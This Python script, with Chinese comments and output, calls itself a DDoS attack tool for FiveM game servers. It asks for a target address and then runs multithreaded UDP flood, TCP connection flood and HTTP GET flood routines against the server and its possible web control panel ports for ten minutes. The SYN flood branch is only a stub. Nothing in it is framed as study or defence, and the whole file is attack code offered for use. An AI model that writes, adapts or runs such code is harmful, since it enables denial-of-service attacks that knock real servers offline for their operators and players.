#!/usr/bin/env python3
"""
FiveM服务器专用DDoS攻击工具
针对FiveM服务器的特殊网络架构优化
"""

import socket
import threading
import time
import random
from concurrent.futures import ThreadPoolExecutor

class FiveMDDoSAttack:
    def __init__(self, target_ip, target_port=30120):
        self.target_ip = target_ip
        self.target_port = target_port
        self.attack_count = 0
        
    def resolve_fivem_server(self, server_ip_or_domain):
        """解析FiveM服务器地址"""
        print(f"🔍 解析FiveM服务器: {server_ip_or_domain}")
        
        try:
            # 如果是域名，解析为IP
            if not server_ip_or_domain.replace('.', '').isdigit():
                ip = socket.gethostbyname(server_ip_or_domain)
                print(f"✅ 解析成功: {server_ip_or_domain} -> {ip}")
                return ip
            else:
                print(f"✅ 使用IP地址: {server_ip_or_domain}")
                return server_ip_or_domain
        except:
            print(f"❌ 无法解析服务器地址")
            return None
    
    def test_fivem_connection(self):
        """测试FiveM服务器连通性"""
        print(f"🔍 测试FiveM服务器连通性...")
        
        try:
            # 尝试连接FiveM服务器
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((self.target_ip, self.target_port))
            sock.close()
            
            if result == 0:
                print(f"✅ FiveM服务器可访问: {self.target_ip}:{self.target_port}")
                return True
            else:
                print(f"❌ FiveM服务器无法连接 (错误码: {result})")
                return False
        except Exception as e:
            print(f"❌ 连接测试失败: {e}")
            return False
    
    def udp_flood_attack(self, threads=200, duration=300):
        """UDP洪水攻击 - FiveM主要使用UDP"""
        print(f"💥 启动UDP洪水攻击 (FiveM主要协议)")
        print(f"🎯 目标: {self.target_ip}:{self.target_port}")
        print(f"⚡ 线程数: {threads}")
        print(f"⏱️ 持续时间: {duration}秒")
        
        self.attack_count = 0
        start_time = time.time()
        
        def udp_flood_thread(thread_id):
            while time.time() - start_time < duration:
                try:
                    # 创建UDP socket
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    
                    # 生成随机数据包 (模拟FiveM流量)
                    packet_size = random.randint(64, 1024)
                    packet_data = random.randbytes(packet_size)
                    
                    # 发送UDP包
                    sock.sendto(packet_data, (self.target_ip, self.target_port))
                    self.attack_count += 1
                    sock.close()
                    
                    # 随机延迟避免过快
                    time.sleep(random.uniform(0.01, 0.1))
                    
                except:
                    pass
        
        # 启动UDP攻击线程
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(udp_flood_thread, i) for i in range(threads)]
            
            # 等待攻击完成
            time.sleep(duration)
            
            # 取消未完成的线程
            for future in futures:
                future.cancel()
        
        elapsed = time.time() - start_time
        packet_rate = self.attack_count / elapsed if elapsed > 0 else 0
        
        print(f"\n📊 UDP攻击统计: {self.attack_count} 数据包 | 速率: {packet_rate:.1f} pkt/s")
    
    def tcp_syn_flood(self, threads=100, duration=300):
        """TCP SYN洪水攻击"""
        print(f"🔗 启动TCP SYN洪水攻击")
        
        def syn_flood_thread(thread_id):
            while time.time() - start_time < duration:
                try:
                    # 创建原始socket (需要管理员权限)
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                    
                    # 构造SYN包 (简化版)
                    # 注意: 原始socket需要管理员权限
                    
                    sock.close()
                except:
                    # 使用普通TCP连接作为备选
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        sock.connect((self.target_ip, self.target_port))
                        sock.close()
                        self.attack_count += 1
                    except:
                        pass
        
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(syn_flood_thread, i) for i in range(threads)]
            time.sleep(duration)
            for future in futures:
                future.cancel()
    
    def http_flood_to_control_panel(self, threads=50, duration=300):
        """HTTP洪水攻击控制面板"""
        print(f"🌐 启动HTTP洪水攻击 (控制面板)")
        
        # FiveM服务器可能有Web控制面板
        web_ports = [80, 443, 8080, 8443]
        
        def http_flood_thread(thread_id):
            while time.time() - start_time < duration:
                for port in web_ports:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(2)
                        sock.connect((self.target_ip, port))
                        
                        # 发送HTTP请求
                        http_request = f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\n\r\n"
                        sock.send(http_request.encode())
                        sock.close()
                        self.attack_count += 1
                    except:
                        pass
        
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(http_flood_thread, i) for i in range(threads)]
            time.sleep(duration)
            for future in futures:
                future.cancel()
    
    def start_comprehensive_attack(self, server_address):
        """启动综合攻击"""
        print("="*60)
        print("🎮 FiveM服务器DDoS攻击工具")
        print("="*60)
        
        # 解析服务器地址
        resolved_ip = self.resolve_fivem_server(server_address)
        if not resolved_ip:
            print("❌ 服务器地址解析失败")
            return
        
        self.target_ip = resolved_ip
        
        # 测试连通性
        if not self.test_fivem_connection():
            print("⚠️ 服务器无法连接，但继续攻击尝试")
        
        # 启动综合攻击
        print("\n💥 启动综合DDoS攻击...")
        
        attack_threads = [
            threading.Thread(target=self.udp_flood_attack, args=(200, 600)),  # UDP攻击
            threading.Thread(target=self.tcp_syn_flood, args=(100, 600)),    # TCP攻击
            threading.Thread(target=self.http_flood_to_control_panel, args=(50, 600))  # HTTP攻击
        ]
        
        # 启动所有攻击线程
        for thread in attack_threads:
            thread.start()
        
        print(f"✅ 启动 {len(attack_threads)} 种攻击方法")
        print("⏰ 攻击将持续10分钟")
        
        # 监控攻击状态
        start_time = time.time()
        duration = 600
        
        while time.time() - start_time < duration:
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            print(f"⏰ 已运行: {elapsed//60}分{elapsed%60}秒 | 剩余: {remaining//60}分{remaining%60}秒 | 攻击计数: {self.attack_count}")
            time.sleep(30)
        
        print("\n🛑 攻击完成")
        print(f"📊 总攻击数据包: {self.attack_count}")

def main():
    # 获取FiveM服务器地址
    print("🎯 请输入FiveM服务器地址:")
    print("   • IP地址 (如: 192.168.1.100)")
    print("   • 域名 (如: myserver.com)")
    print("   • 带端口 (如: 192.168.1.100:30120)")
    
    server_input = input("服务器地址: ").strip()
    
    # 解析端口
    if ':' in server_input:
        server_parts = server_input.split(':')
        server_address = server_parts[0]
        server_port = int(server_parts[1])
    else:
        server_address = server_input
        server_port = 30120  # FiveM默认端口
    
    # 创建攻击实例
    attacker = FiveMDDoSAttack('', server_port)
    
    # 启动攻击
    attacker.start_comprehensive_attack(server_address)

if __name__ == "__main__":
    main()